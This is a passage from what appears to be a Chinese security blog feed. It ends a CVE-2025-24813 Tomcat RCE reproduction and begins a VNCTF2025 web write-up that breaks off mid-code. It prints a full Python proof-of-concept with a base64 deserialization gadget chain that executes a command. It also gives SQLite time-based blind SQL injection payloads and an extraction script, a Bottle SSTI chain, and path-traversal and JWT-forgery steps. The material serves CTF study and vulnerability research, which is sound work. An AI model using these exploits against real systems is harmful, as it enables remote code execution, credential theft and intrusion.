&#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (ois != <span class="literal">null</span>) &#123;</span><br><span class="line">                    ois.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var20) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fis.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var17) &#123;</span><br><span class="line">                    var20.addSuppressed(var17);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> var20;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fis.close();</span><br><span class="line">            <span class="keyword">return</span> var9;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException var21) &#123;</span><br><span class="line">            <span class="keyword">if</span> (contextLog.isDebugEnabled()) &#123;</span><br><span class="line">                contextLog.debug(sm.getString(<span class="string">&quot;fileStore.noFile&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id, file.getAbsolutePath()&#125;));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ois = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            context.unbind(Globals.IS_SECURITY_ENABLED, oldThreadContextCL);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ois;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先跟进一下File file &#x3D; this.file(id);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> File <span class="title function_">file</span><span class="params">(String id)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">       <span class="type">File</span> <span class="variable">storageDir</span> <span class="operator">=</span> <span class="built_in">this</span>.directory();</span><br><span class="line">       <span class="keyword">if</span> (storageDir == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> id + <span class="string">&quot;.session&quot;</span>;</span><br><span class="line">           <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(storageDir, filename);</span><br><span class="line">           <span class="type">File</span> <span class="variable">canonicalFile</span> <span class="operator">=</span> file.getCanonicalFile();</span><br><span class="line">           <span class="keyword">if</span> (!canonicalFile.toPath().startsWith(storageDir.getCanonicalFile().toPath())) &#123;</span><br><span class="line">               log.warn(sm.getString(<span class="string">&quot;fileStore.invalid&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;file.getPath(), id&#125;));</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">return</span> canonicalFile;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这里已经修复了当时的目录穿越问题导致的反序列化，修复⽅式就是getCanonicalFile处理穿越问题。</p><p>因此现在只能加载缓存目录下的id + “.session”文件并将其反序列化，反序列化的触发点依旧是存在的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1  </span><br><span class="line">Host: localhost:8080  </span><br><span class="line">Cookie: JSESSIONID=.aaa</span><br></pre></td></tr></table></figure><p>我们发这个触发包调试一下看看</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321181300810.png" class="" title="This is an example image"><p>接着我们恢复程序，发现成功弹出计算器！</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321181341232.png" class="" title="This is an example image"><p>复现完成！接下来给出大b哥给出的POC！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author: @Boogipop </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">put_request</span>(<span class="params">url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, timeout=<span class="number">10</span>, verify=<span class="literal">True</span></span>): </span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">response = requests.put( </span><br><span class="line">url=url, </span><br><span class="line">data=data, </span><br><span class="line">headers=headers, </span><br><span class="line">timeout=timeout, </span><br><span class="line">      verify=verify </span><br><span class="line">) </span><br><span class="line"><span class="keyword">return</span> response </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;PUT请求发⽣错误: <span class="subst">&#123;e&#125;</span>&quot;</span>) </span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_request</span>(<span class="params">url, headers=<span class="literal">None</span>, timeout=<span class="number">10</span>, verify=<span class="literal">True</span></span>): </span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">response = requests.get( </span><br><span class="line">url=url, </span><br><span class="line">headers=headers, </span><br><span class="line">timeout=timeout, </span><br><span class="line">verify=verify </span><br><span class="line">) </span><br><span class="line"><span class="keyword">return</span> response </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;GET请求发⽣错误: <span class="subst">&#123;e&#125;</span>&quot;</span>) </span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">target_url = <span class="string">&quot;http://127.0.0.1:8080/a/session&quot;</span> </span><br><span class="line">payload =</span><br><span class="line">base64.b64decode(<span class="string">&quot;rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8</span></span><br><span class="line"><span class="string">Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEA</span></span><br><span class="line"><span class="string">DWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY</span></span><br><span class="line"><span class="string">3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbu</span></span><br><span class="line"><span class="string">WUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmc</span></span><br><span class="line"><span class="string">uYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNm</span></span><br><span class="line"><span class="string">b3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvb</span></span><br><span class="line"><span class="string">W1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAARzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3</span></span><br><span class="line"><span class="string">Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN</span></span><br><span class="line"><span class="string">0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVu</span></span><br><span class="line"><span class="string">Y3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kT</span></span><br><span class="line"><span class="string">mFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbm</span></span><br><span class="line"><span class="string">cuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXB0AAlnZXRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxb</span></span><br><span class="line"><span class="string">XrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB9zcQB+ABZ1cQB+ABsAAAACcHB0AAZp</span></span><br><span class="line"><span class="string">bnZva2V1cQB+AB8AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXEAfgAbAAAAAXQAEk9wZ</span></span><br><span class="line"><span class="string">W4gLWEgQ2FsY3VsYXRvcnQABGV4ZWN1cQB+AB8AAAABcQB+ACJzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYW</span></span><br><span class="line"><span class="string">RGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4dnIAEmphdmEubGFuZy5PdmVycmlkZQAAAAAAAAAAAAAAeHB</span></span><br><span class="line"><span class="string">xAH4AMw==&quot;</span>) </span><br><span class="line">range_len = <span class="built_in">len</span>(payload) </span><br><span class="line">custom_headers = &#123; </span><br><span class="line"><span class="string">&quot;Content-Range&quot;</span>: <span class="string">f&quot;bytes 0-<span class="subst">&#123;range_len+<span class="number">1</span>&#125;</span>/1200&quot;</span> </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">response = put_request(url=target_url, data=payload, headers=custom_headers) </span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">409</span>: </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] ⽂件上传成功&quot;</span>) </span><br><span class="line"> </span><br><span class="line">triggle_url = <span class="string">&quot;http://127.0.0.1:8080/&quot;</span> </span><br><span class="line">get_headers = &#123; </span><br><span class="line"><span class="string">&quot;JSESSIONID&quot;</span>:<span class="string">&quot;.a&quot;</span> </span><br><span class="line">&#125; </span><br><span class="line">get_response = get_request(url=triggle_url,headers=get_headers) </span><br><span class="line"><span class="keyword">if</span> get_response: </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 触发 Payload&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2025-Web-wp</title>
      <link href="/2025/02/16/VNCTF2025-Web-wp/"/>
      <url>/2025/02/16/VNCTF2025-Web-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="奶龙回家"><a href="#奶龙回家" class="headerlink" title="奶龙回家"></a>奶龙回家</h2><p>就一个登录框。。尝试sql注入</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215151012213.png" class="" title="图片引用方法一"><p>回显发生了某种错误？？实锤sql注入</p><p>bp fuzz一下看看过滤</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215152313743.png" class="" title="图片引用方法一"><p>过滤了&#x3D; sleep union length等等</p><p>先随便测测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;123&#x27;/**/or/**/&#x27;1&#x27;&lt;&#x27;2&quot;,&quot;password&quot;:&quot;123&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;123&#x27;/**/or/**/1&lt;2/*&quot;,&quot;password&quot;:&quot;123&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;123&#x27;/**/or/**/1&lt;2--&quot;,&quot;password&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure><p>都是回显账号或密码错误，过滤挺多，感觉只能盲注了。试了半天的database()不行。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;123&#x27;/**/or/**/substr(sqlite_version(),1,1)&gt;&#x27;0&#x27;--&quot;,&quot;password&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure><p>回显账号或密码错误，正常了！说明数据库为sqlite，sqlite没有sleep函数，但是有randomblob函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;123&#x27;/**/or/**/(case/**/when/**/(substr(sqlite_version(),1,1)&gt;&#x27;0&#x27;)/**/then/**/randomblob(1000000000)/**/else/**/0/**/end)--&quot;,&quot;password&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215153953719.png" class="" title="图片引用方法一"><p>出现明显的时间延迟。可以采用时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://node.vnteam.cn:47824/login&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="comment">#payload = &quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/name/**/from/**/sqlite_master/**/where/**/type&lt;&#x27;zable&#x27;),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(500000000)/**/else/**/0/**/end)/*&quot;.format(i,chr(mid))</span></span><br><span class="line">        <span class="comment">#payload = &quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(sql))/**/from/**/sqlite_master/**/where/**/type/**/like/**/&#x27;table&#x27;/**/and/**/name/**/like/**/&#x27;users&#x27;),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(500000000)/**/else/**/0/**/end)/*&quot;.format(i,chr(mid))</span></span><br><span class="line">        payload = <span class="string">&quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/group_concat(password)from/**/users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(500000000)/**/else/**/0/**/end)/*&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">chr</span>(mid))</span><br><span class="line">        datas = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="string">&#x27;123&#x27;</span></span><br><span class="line">     &#125;</span><br><span class="line">        start_time=time.time()</span><br><span class="line">        res = requests.post(url=url,json=datas)</span><br><span class="line">        end_time=time.time()</span><br><span class="line">        spend_time=end_time-start_time</span><br><span class="line">        <span class="keyword">if</span> spend_time&gt;=<span class="number">1</span>:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&#x27;\n&#x27;+bytes.fromhex(flag).decode(&#x27;utf-8&#x27;))</span></span><br></pre></td></tr></table></figure><p>依次爆出username和password</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: nailong</span><br><span class="line">password: woaipangmao114514</span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215170055294.png" class="" title="图片引用方法一"><h2 id="学生姓名登记系统"><a href="#学生姓名登记系统" class="headerlink" title="学生姓名登记系统"></a>学生姓名登记系统</h2><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215170412217.png" class="" title="图片引用方法一"><p>单文件框架？谷歌搜索一下得知为bottle框架，比较冷门，我们看看官方手册：<a href="https://www.osgeo.cn/bottle/">https://www.osgeo.cn/bottle/</a></p><p>它的模板引擎叫SimpleTemplate，考察的估计就是ssti了</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215174546841.png" class="" title="图片引用方法一"><p>测的时候我们发现单行最长23字符，不然会报错，同时我们发现python版本为3.12.x，python3.8以后出现了海象运算符，可以进行拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a:=&#x27;&#x27;.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;b:=a.__base__&#125;&#125;</span><br><span class="line">&#123;&#123;c:=b.__subclasses__&#125;&#125;</span><br><span class="line">&#123;&#123;d:=c()[154]&#125;&#125;</span><br><span class="line">&#123;&#123;e:=d.__init__&#125;&#125;</span><br><span class="line">&#123;&#123;f:=e.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><p>直接在__globals__中找到了flag</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215175408704.png" class="" title="图片引用方法一"><h2 id="Gin"><a href="#Gin" class="headerlink" title="Gin"></a>Gin</h2><p>一道go的白盒审计</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215180048030.png" class="" title="图片引用方法一"><p>看到这里，可以猜想一下大致思路，存在admin用户和user用户，user用户可以上传文件，admin用户可以eval执行命令。同时存在jwt鉴权，那肯定与jwt有关了嘛</p><p>然后看一下eval路由是怎么执行命令的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Eval</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">code := c.PostForm(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">log.Println(code)</span><br><span class="line"><span class="keyword">if</span> code == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">response.Response(c, http.StatusBadRequest, <span class="number">400</span>, <span class="literal">nil</span>, <span class="string">&quot;No code provided&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">log.Println(containsBannedPackages(code))</span><br><span class="line"><span class="keyword">if</span> containsBannedPackages(code) &#123;</span><br><span class="line">response.Response(c, http.StatusBadRequest, <span class="number">400</span>, <span class="literal">nil</span>, <span class="string">&quot;Code contains banned packages&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">tmpFile, err := ioutil.TempFile(<span class="string">&quot;&quot;</span>, <span class="string">&quot;goeval-*.go&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Error creating temp file:&quot;</span>, err)</span><br><span class="line">response.Response(c, http.StatusInternalServerError, <span class="number">500</span>, <span class="literal">nil</span>, <span class="string">&quot;Error creating temporary file&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> os.Remove(tmpFile.Name())</span><br><span class="line"></span><br><span class="line">_, err = tmpFile.WriteString(code)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Error writing code to temp file:&quot;</span>, err)</span><br><span class="line">response.Response(c, http.StatusInternalServerError, <span class="number">500</span>, <span class="literal">nil</span>, <span class="string">&quot;Error writing code to temp file&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cmd := exec.Command(<span class="string">&quot;go&quot;</span>, <span class="string">&quot;run&quot;</span>, tmpFile.Name())</span><br><span class="line">output, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Error running Go code:&quot;</span>, err)</span><br><span class="line">response.Response(c, http.StatusInternalServerError, <span class="number">500</span>, gin.H&#123;<span class="string">&quot;error&quot;</span>: <span class="type">string</span>(output)&#125;, <span class="string">&quot;Error executing code&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response.Success(c, gin.H&#123;<span class="string">&quot;result&quot;</span>: <span class="type">string</span>(output)&#125;, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是执行一个go文件，这个go文件就是我们上传的，再有由admin用户来执行！</p><p>那么我们首先需要关注的是jwt伪造。要获取secret_key先，应该是保存在key.go，那么我们要怎么获得呢？？？</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Download</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">filename := c.DefaultQuery(<span class="string">&quot;filename&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> filename == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">response.Response(c, http.StatusBadRequest, <span class="number">400</span>, <span class="literal">nil</span>, <span class="string">&quot;Filename is required&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">basepath := <span class="string">&quot;./uploads&quot;</span></span><br><span class="line">filepath, _ := url.JoinPath(basepath, filename)</span><br><span class="line"><span class="keyword">if</span> _, err := os.Stat(filepath); os.IsNotExist(err) &#123;</span><br><span class="line">response.Response(c, http.StatusBadRequest, <span class="number">404</span>, <span class="literal">nil</span>, <span class="string">&quot;File not found&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">c.Header(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; filename=&quot;</span>+filename)</span><br><span class="line">c.File(filepath)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JoinPath一眼目录穿越，可以任意下载文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node.vnteam.cn:45733/download?filename=/../config/key.go</span><br></pre></td></tr></table></figure><p>直接拿下key.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> config</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Key</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;r00t32l&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Year</span><span class="params">()</span></span> <span class="type">int64</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2025</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获得一个Key和一个Year的。</p><p>看看jwt密钥生成逻辑</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GenerateKey</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">rand.Seed(config.Year())</span><br><span class="line">randomNumber := rand.Intn(<span class="number">1000</span>)</span><br><span class="line">key := fmt.Sprintf(<span class="string">&quot;%03d%s&quot;</span>, randomNumber, config.Key())</span><br><span class="line"><span class="keyword">return</span> key</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地模拟一下。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span 